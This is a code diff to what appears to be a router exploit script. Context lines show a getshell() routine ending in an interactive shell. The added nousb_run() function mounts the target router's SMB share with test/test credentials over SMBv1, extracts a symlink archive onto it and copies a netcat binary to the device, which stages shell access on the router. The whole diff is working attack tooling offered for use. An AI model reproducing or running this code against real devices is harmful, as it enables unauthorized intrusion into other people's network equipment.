@@ -6,6 +6,8 @@ from base64 import b64decode,b64encode
 from random import randint
 from Crypto.Util.Padding import pad
 import socket
+import subprocess
+from time import sleep
 
 def checkheader(form):
     check = str(sha256(form.encode()).hexdigest())
@@ -98,3 +100,25 @@ def getshell():
     else:
         print(line)
     l.interactive()
+
+def nousb_run(host):
+    print("[nousb]: Waiting 2 seconds for server startup...")
+    sleep(2)
+    subprocess.run(['mkdir','-p','dest'])
+    print("[nousb]: Created dest/ mountpoint")
+    a = subprocess.run(['mount','-t','cifs','-o','username=test,password=test,vers=1.0','\\\\'+host+'\\samba','dest'])
+    if a.returncode != 0:
+        print("[nousb]: Ensure that cifs-utils package is installed on the system or samba already mounted. Stopping")
+        exit(0)
+    print("[nousb]: Mounted router smb on dest/")
+    sleep(1)
+    subprocess.run(['unzip','-oqq','symlink.zip','-d','dest/'],capture_output=False, stderr=subprocess.DEVNULL)
+    print("[nousb]: Symlink copied")
+    subprocess.run(['cp','../bin/nc','dest/'])
+    print("[nousb]: Nc copied")
+    sleep(1)
+    subprocess.run(['umount','dest'])
+    print("[nousb]: Unmounted router smb")
+    subprocess.run(['rm','-rf','dest'])
+    print("[nousb]: Deleted dest/ mountpoint")
+
